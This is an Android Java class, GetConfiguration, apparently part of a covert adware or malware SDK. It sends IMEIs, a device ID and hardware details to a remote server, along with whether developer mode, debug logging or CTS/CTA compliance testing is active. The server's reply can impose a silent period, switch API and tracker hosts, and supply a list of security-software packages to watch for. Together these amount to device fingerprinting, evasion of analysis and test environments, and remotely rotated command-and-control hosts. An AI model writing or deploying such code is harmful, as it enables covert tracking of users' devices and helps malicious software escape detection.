package com.hs.cld.q;

import android.content.Context;

import com.hs.cld.basic.Builder;
import com.hs.cld.common.utils.Device;
import com.hs.cld.common.utils.KVUtils;
import com.hs.cld.common.utils.LOG;
import com.hs.cld.common.utils.SystemUtils;
import com.hs.cld.common.utils.TextUtils;
import com.hs.cld.basic.HTTPRequester;
import com.hs.cld.basic.Hosts;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class GetConfiguration extends HTTPRequester {
	private final boolean mGetMutexPkgs;

	private boolean mIsSilent = false;
	private long mSilentToInMillis = 0;
	private long mPeriodsInSeconds = 0;
	private boolean mLogEnabled = false;
	private boolean mIgnoreDevMode = false;
	private boolean mIgnoreLogD = false;
	private boolean mIgnoreCTS = false;
	private boolean mIgnoreCTA = false;
	private boolean mIgnoreMutexPkgs = false;

	private String mApiHosts = "";
	private String mTrackerHosts = "";
	private List<String> mMutexPkgs = null;

	/**
	 * 构造函数
	 * @param context 上下文对象
	 * @param getMutexPkgs 是否读取安全软件列表
	 */
	public GetConfiguration(Context context, boolean getMutexPkgs) {
		super(context, "GetConfiguration");
		setRequestPath("api/v1/q");
		setTargetHosts(Hosts.APIS(context));
		this.mGetMutexPkgs = getMutexPkgs;
	}

	public boolean isSilent() {
		return mIsSilent;
	}

	public long getSilentToInMillis() {
		return mSilentToInMillis;
	}

	public long getPeriodsInSeconds() {
		return mPeriodsInSeconds;
	}

	public boolean isLogEnabled() {
		return mLogEnabled;
	}

	public boolean isIgnoreDevMode() {
		return mIgnoreDevMode;
	}

	public boolean isIgnoreLogD() {
		return mIgnoreLogD;
	}

	public boolean isIgnoreCTS() {
		return mIgnoreCTS;
	}

	public boolean isIgnoreCTA() {
		return mIgnoreCTA;
	}

	public boolean isIgnoreMutexPkgs() {
		return mIgnoreMutexPkgs;
	}

	public String getApiHosts() {
		return mApiHosts;
	}

	public String getTrackerHosts() {
		return mTrackerHosts;
	}

	public List<String> getMutexPkgs() {
		return mMutexPkgs;
	}

	public void check() throws Exception {
		String parameter = buildParameter();
		LOG.i(TAG, "GC: parameter=" + parameter);
		setRequestBody(parameter);

		jsonExecute();
		handleResponse();
	}

	private String buildParameter() throws JSONException {
		JSONObject jo = new JSONObject();
		jo.put("m1", notNull(Device.getManufacturer()));
		jo.put("d1", notNull(Device.getBrand()));
		jo.put("d2", notNull(Device.getModel()));
		jo.put("i44", notNull(Device.getm1(mContext)));
		jo.put("i50", notNull(getIMEIs(mContext)));
		jo.put("d49", notNull(getDeviceId(mContext)));
		jo.put("a1", "" + SystemUtils.getSelfVersionCode(mContext));
		jo.put("a2", SystemUtils.getSelfPackageName(mContext));
		jo.put("o1", SystemUtils.getOSRelease());
		jo.put("o2", "" + SystemUtils.getOSDKInt());
		jo.put("o3", SystemUtils.getROMRelease());
		jo.put("o4", (SystemUtils.isDevModeEnabled(mContext) ? "1" : "0"));
		jo.put("o5", (LOG.isLogD() ? "1" : "0"));
		jo.put("o6", (SystemUtils.isCTSEnabled(mContext) ? "1" : "0"));
		jo.put("o7", (SystemUtils.isCTAEnabled(mContext) ? "1" : "0"));
		jo.put("c0", Builder.CHANNEL);
		jo.put("v0", Builder.VERSION);
		jo.put("p0", mGetMutexPkgs ? "1" : "0");
		return jo.toString();
	}

	private void handleResponse() throws Exception {
		String responseData = getResponseData();
		LOG.i(TAG, "GC: response=" + responseData);

		if (!TextUtils.empty(responseData)) {
			JSONObject jo = new JSONObject(responseData);
			mIsSilent = KVUtils.getBoolean(jo, "s1", false);
			long defaultValue = (System.currentTimeMillis() + (3 * 24 * 3600000L));
			mSilentToInMillis = KVUtils.getLong(jo, "s2", defaultValue);
			mPeriodsInSeconds = KVUtils.getLong(jo, "c1", -1);
			mLogEnabled = KVUtils.getBoolean(jo, "e1", false);
			mIgnoreLogD = KVUtils.getBoolean(jo, "i0", false);
			mIgnoreDevMode = KVUtils.getBoolean(jo, "i1", false);
			mIgnoreCTS = KVUtils.getBoolean(jo, "i2", false);
			mIgnoreCTA = KVUtils.getBoolean(jo, "i3", false);
			mIgnoreMutexPkgs = KVUtils.getBoolean(jo, "i4", false);

			String apiHosts = KVUtils.getString(jo, "h1", "");
			if (validate(apiHosts)) {
				mApiHosts = apiHosts;
			}

			String trackerHosts = KVUtils.getString(jo, "h2", "");
			if (validate(trackerHosts)) {
				mTrackerHosts = trackerHosts;
			}

			if (jo.has("p0")) {
				mMutexPkgs = parseMutexPkgs(jo);
			}
		}
	}

	private List<String> parseMutexPkgs(JSONObject jo) {
		try {
			return getStringList(jo.getString("p0"));
		} catch (Exception e) {
			LOG.w(TAG, "parse p0 node failed: " + e);
		}
		return null;
	}

	/**
	 * 安全获取JSON对象中的字符串类型
	 * @param json JSON数组字符串
	 * @return 指定名字对应的字符串类型
	 */
	public static List<String> getStringList(String json) throws Exception {
		List<String> l = new ArrayList<>();

		if (!TextUtils.empty(json)) {
			JSONArray ja = new JSONArray(json);

			for (int i = 0; i < ja.length(); i++) {
				l.add(ja.getString(i));
			}
		}

		return l;
	}

	private boolean validate(String host) {
		return ((!TextUtils.empty(host)) && (!host.equalsIgnoreCase("0")));
	}
}
